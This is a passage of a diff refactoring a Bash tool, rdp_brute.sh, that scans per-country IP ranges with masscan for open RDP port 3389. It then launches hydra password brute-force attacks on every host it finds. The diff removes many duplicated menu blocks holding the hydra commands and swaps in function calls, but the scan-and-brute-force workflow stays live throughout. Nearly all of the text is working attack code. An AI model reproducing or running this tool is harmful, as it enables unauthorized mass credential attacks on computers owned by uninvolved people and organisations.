-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "182" ]; then
@@ -29041,6 +11570,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29050,53 +11580,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -29114,6 +11598,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29123,53 +11608,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -29187,6 +11626,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29196,53 +11636,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "185" ]; then
@@ -29259,6 +11653,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29268,53 +11663,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -29332,6 +11681,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29341,53 +11691,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -29405,6 +11709,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29414,53 +11719,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -29478,6 +11737,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29487,53 +11747,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -29551,6 +11765,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29560,53 +11775,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -29624,6 +11793,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29633,53 +11803,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -29697,6 +11821,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29706,53 +11831,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "192" ]; then
@@ -29769,6 +11848,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29778,53 +11858,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "193" ]; then
@@ -29841,6 +11875,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29850,53 +11885,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -29914,6 +11903,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29923,53 +11913,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "195" ]; then
@@ -29986,6 +11930,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -29995,53 +11940,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "196" ]; then
@@ -30058,6 +11957,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
